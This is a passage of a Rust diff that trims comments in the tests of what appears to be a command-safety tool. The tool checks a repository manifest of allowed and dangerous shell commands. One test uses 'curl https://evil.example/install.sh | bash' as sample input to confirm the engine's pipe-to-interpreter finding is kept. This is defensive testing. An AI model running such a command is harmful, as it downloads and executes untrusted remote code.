             .expect_err("a duplicate dangerous[].pattern must be a parse error");
@@ -829,8 +701,8 @@ mod tests {
 
     #[test]
     fn unknown_entry_field_is_rejected() {
-        // F2 (Major): unknown fields inside `allowed[]` / `dangerous[]` entries
-        // are also rejected, so a typo'd entry key cannot be silently dropped.
+        // F2: unknown fields inside entries are rejected too, so a typo'd entry key
+        // cannot be silently dropped.
         let bad_allowed = "allowed:\n  - name: test\n    commandd: npm test\n";
         assert!(matches!(
             CommandsManifest::from_yaml(bad_allowed),
@@ -868,16 +740,12 @@ mod tests {
 
     #[test]
     fn match_uses_shell_significant_whitespace_trim() {
-        // CodeRabbit R9 #A: manifest matching must trim ONLY shell-significant
-        // whitespace (space/tab/newline/CR — see `is_shell_significant_ws`), in
-        // lockstep with the command-card `command_matches` gate. A U+00A0
-        // NO-BREAK SPACE is Unicode whitespace but NOT shell-significant
-        // whitespace.
+        // CodeRabbit R9 #A: matching trims ONLY shell-significant whitespace, in
+        // lockstep with the command-card gate. U+00A0 is Unicode whitespace but
+        // NOT shell-significant.
         let nbsp = '\u{00A0}';
 
-        // (a) A manifest `allowed[]` entry padded with a NO-BREAK SPACE must NOT
-        // match an ASCII-space command — `str::trim` would have wrongly equated
-        // them, disagreeing with the command-card gate.
+        // (a) A NBSP-padded `allowed[]` entry must NOT match an ASCII-space command.
         let padded_entry = CommandsManifest::from_yaml(&format!(
             "allowed:\n  - name: build\n    command: \"npm run build{nbsp}\"\n"
         ))
@@ -1020,9 +888,8 @@ mod tests {
 
     #[test]
     fn evaluate_dangerous_warn_action_emits_medium() {
-        // type-design #4 / #7: `action: warn` must wire to a Medium-severity
-        // finding (→ Warn action), not the default High (→ Block). The `.action`
-        // field is now load-bearing, not a dead read.
+        // type-design #4/#7: `action: warn` wires to a Medium finding (→ Warn), not
+        // the default High (→ Block).
         let m = CommandsManifest::from_yaml(
             r#"
 dangerous:
@@ -1092,9 +959,8 @@ dangerous:
 
     #[test]
     fn evaluate_never_returns_engine_findings() {
-        // The invariant probe: evaluate is handed a High engine finding and
-        // must NOT return it, downgrade it, or reference it. Its contribution
-        // is purely additive.
+        // Invariant probe: handed a High engine finding, evaluate must NOT return,
+        // downgrade, or reference it — its contribution is purely additive.
         let engine_high = Finding {
             rule_id: RuleId::PipeToInterpreter,
             severity: Severity::High,
@@ -1119,8 +985,7 @@ allowed:
             "curl https://evil.example/install.sh | bash",
             std::slice::from_ref(&engine_high),
         );
-        // The allowed match is recorded for audit, but evaluate contributes
-        // NOTHING (it only ever suppresses its own RepoCommandUnknown). The
+        // Allowed match recorded for audit, but evaluate contributes NOTHING; the
         // engine's High finding is not in the outcome at all.
         assert_eq!(out.matched_allowed_name.as_deref(), Some("installer"));
         assert!(out.findings.is_empty());
@@ -1145,11 +1010,9 @@ allowed:
     fn cached_load_hits_then_remits_on_mtime_change() {
         use std::io::Write as _;
 
-        // P2: discover() is hot-path; cached_load caches by (path, mtime) with a
-        // 5s TTL. Prove (a) a second load of an UNCHANGED file returns the
-        // cached parse (does not observe a sneaky out-of-band content change
-        // while the file's identity/mtime are unchanged), and (b) an mtime bump
-        // forces a re-read that reflects the new content.
+        // P2: cached_load caches by (path, mtime) with a 5s TTL. Prove (a) a second
+        // load of an unchanged file returns the cached parse, and (b) an mtime bump
+        // forces a re-read of the new content.
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("commands.yaml");
 
@@ -1167,14 +1030,13 @@ allowed:
         assert_eq!(first.allowed[0].name, "a");
         let mtime_before = manifest_mtime_nanos(&path);
 
-        // A second load while the file is unchanged returns the SAME parse from
-        // cache (cheap hit) — this is the perf win we are pinning.
+        // A second load of the unchanged file returns the cached parse (the perf
+        // win we are pinning).
         let cached = cached_load(&path).unwrap();
         assert_eq!(cached.allowed[0].command, "cmd-a");
 
-        // Now change the content AND ensure the OS-reported mtime actually
-        // advanced before asserting a re-read. Spin (bounded) rather than a
-        // fixed sleep so the test is robust to coarse mtime granularity.
+        // Change content, then spin (bounded) until the OS-reported mtime actually
+        // advances — robust to coarse mtime granularity, no fixed sleep.
         let mut tries = 0;
         loop {
             let mut f = std::fs::File::create(&path).unwrap();
@@ -1202,12 +1064,9 @@ allowed:
         invalidate_cache();
     }
 
-    /// CodeRabbit R17 #1 (read-guard class): `load_from_path` is on the exec hot
-    /// path and reads a REPO-controlled `.tirith/commands.yaml`. A FIFO/device at
-    /// that path must be REJECTED promptly (a fail-safe parse error) — NOT block
-    /// the open forever waiting for a writer, which a plain `read_to_string`
-    /// would. Unix-only (needs `mkfifo`); cannot hang — the hardened reader's
-    /// `O_NONBLOCK` open returns immediately on a FIFO.
+    /// CodeRabbit R17 #1: a FIFO at the manifest path must be rejected promptly
+    /// (fail-safe parse error), not block the open waiting for a writer. Unix-only
+    /// (needs `mkfifo`); the hardened reader's `O_NONBLOCK` open returns at once.
     #[cfg(unix)]
     #[test]
     fn load_from_path_on_fifo_does_not_hang_and_errors() {
@@ -1239,21 +1098,15 @@ allowed:
         );
     }
 
-    /// CodeRabbit R19 #1: a PRESENT-but-not-a-regular-file `.tirith/commands.yaml`
-    /// (a directory, a FIFO, or a dangling symlink) must be treated as PRESENT —
-    /// discovery STOPS there and `discover` surfaces a parse error — NOT silently
-    /// skipped as if no manifest existed (which would drop the suppression-bounded
-    /// note AND the dangerous-glob enforcement). Old `is_file()` presence detection
-    /// coerced all three to `false`; the fix uses `symlink_metadata`. Unix-only
-    /// (needs `mkfifo`/symlink); a `.git` marker bounds the walk-up so the probe
-    /// can never escape into a real ancestor `.tirith/commands.yaml`.
+    /// CodeRabbit R19 #1: a present-but-not-a-regular-file manifest (dir, FIFO,
+    /// dangling symlink) must read as PRESENT (discovery stops, surfaces a parse
+    /// error), not be skipped. Old `is_file()` coerced all three to `false`; the
+    /// fix uses `symlink_metadata`. Unix-only.
     #[cfg(unix)]
     #[test]
     fn manifest_path_present_treats_stat_errors_as_present_not_absent() {
-        // CodeRabbit R13f: only a genuine NotFound is "absent". Any OTHER
-        // symlink_metadata error (EACCES, ENOTDIR, symlink loop) means a
-        // present-but-unstattable entry, which must read as PRESENT so discovery
-        // surfaces the unloadable manifest rather than silently walking past it.
+        // CodeRabbit R13f: only a genuine NotFound is "absent"; any other stat
+        // error (EACCES/ENOTDIR/symlink loop) must read as PRESENT.
         let dir = tempfile::tempdir().unwrap();
         // Genuinely absent → false.
         assert!(!manifest_path_present(&dir.path().join("nope.yaml")));
@@ -1280,9 +1133,7 @@ allowed:
     fn present_but_broken_manifest_is_not_silently_skipped() {
         use std::ffi::CString;
 
-        // A non-broken control: with NO `.tirith/commands.yaml` and a `.git`
-        // boundary, discovery finds nothing (returns absent) — the baseline the
-        // three broken kinds must differ from.
+        // Control: no manifest + a `.git` boundary → discovery finds nothing.
         let absent = tempfile::tempdir().unwrap();
         std::fs::create_dir_all(absent.path().join(".git")).unwrap();
         let absent_cwd = absent.path().to_str().unwrap();
@@ -1297,9 +1148,8 @@ allowed:
             "no manifest must yield Ok(None), not an error"
         );
 
-        // Helper: build an isolated repo whose `.tirith/` exists, run `setup`
-        // to create the broken `commands.yaml` entry, then assert PRESENCE
-        // (discovery stops here) and that `discover` surfaces an Err.
+        // Helper: build an isolated repo, run `setup` to create the broken
+        // `commands.yaml`, then assert PRESENCE and that `discover` returns Err.
         fn assert_present_and_errors(setup: impl FnOnce(&Path)) {
             let dir = tempfile::tempdir().unwrap();
             std::fs::create_dir_all(dir.path().join(".git")).unwrap();
